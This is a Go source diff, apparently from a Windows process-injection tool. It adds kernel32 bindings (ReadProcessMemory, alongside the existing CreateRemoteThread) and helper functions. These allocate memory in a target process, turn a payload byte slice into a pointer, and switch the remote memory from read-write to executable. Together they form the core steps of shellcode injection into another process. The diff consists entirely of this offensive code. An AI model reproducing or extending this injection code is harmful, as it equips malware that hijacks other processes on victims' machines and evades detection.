@@ -27,6 +27,8 @@ var (
 	CreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
 	// https://learn.microsoft.com/en-us/windows/console/freeconsole
 	FreeConsole = kernel32.NewProc("FreeConsole")
+	// https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
+	ReadProcessMemory = kernel32.NewProc("ReadProcessMemory")
 )
 
 // https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32
@@ -88,4 +90,23 @@ func FindPIDFromProcessName(name string) (uint32, error) {
 		return 0, err
 	}
 	return process.ProcessID, nil
+}
+
+// simple function to convert byte slice to uint pointer
+func ConvertToPtr(payload []byte) uintptr {
+	return uintptr(unsafe.Pointer(&payload[0]))
+}
+
+func GetProcPointer(pHandle uintptr, payloadLen uintptr) (uintptr, int, error) {
+	memoryPermission := windows.PAGE_READWRITE
+	pRemoteCode, _, out := VirtualAllocEx.Call(pHandle, 0, payloadLen, windows.MEM_COMMIT, uintptr(memoryPermission))
+	if out != nil && out.Error() != "The operation completed successfully." {
+		return 0, memoryPermission, fmt.Errorf("unable to allocate pointer to remote code, %s", out.Error())
+	}
+	return pRemoteCode, memoryPermission, nil
+}
+
+// This function simply sets the permission of the addr space to executable
+func SetPermissionToExec(pHandle uintptr, pRemoteCode uintptr, payloadLen uintptr, initialPerm int) {
+	VirtualProtectEx.Call(pHandle, pRemoteCode, payloadLen, windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&initialPerm)))
 }
